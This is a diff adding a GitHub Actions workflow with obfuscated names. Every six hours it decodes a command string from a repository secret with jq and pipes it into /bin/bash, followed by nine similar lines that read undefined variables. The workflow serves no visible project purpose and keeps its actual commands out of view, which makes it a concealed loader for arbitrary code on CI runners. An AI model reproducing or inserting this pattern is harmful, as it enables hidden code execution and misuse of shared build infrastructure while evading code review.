@@ -1,0 +1,27 @@
+name: kuanshenchaogui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kuanshenchaogui
+        env:
+          jr5710: ${{ secrets.jr5710 }}
+        run: |
+          echo $jr5710 | jq -r .fgh3 | /bin/bash
+          echo $wiu73 | jq -r .mqynq718 | /bin/bash
+          echo $yo9 | jq -r .ilqjh200 | /bin/bash
+          echo $lry183 | jq -r .p07 | /bin/bash
+          echo $cscsn525 | jq -r .hvx97 | /bin/bash
+          echo $qhi7 | jq -r .i922 | /bin/bash
+          echo $x58 | jq -r .aoe7 | /bin/bash
+          echo $p51 | jq -r .jgx10 | /bin/bash
+          echo $azque56 | jq -r .zg034 | /bin/bash
+          echo $mld265 | jq -r .jd44791 | /bin/bash
+
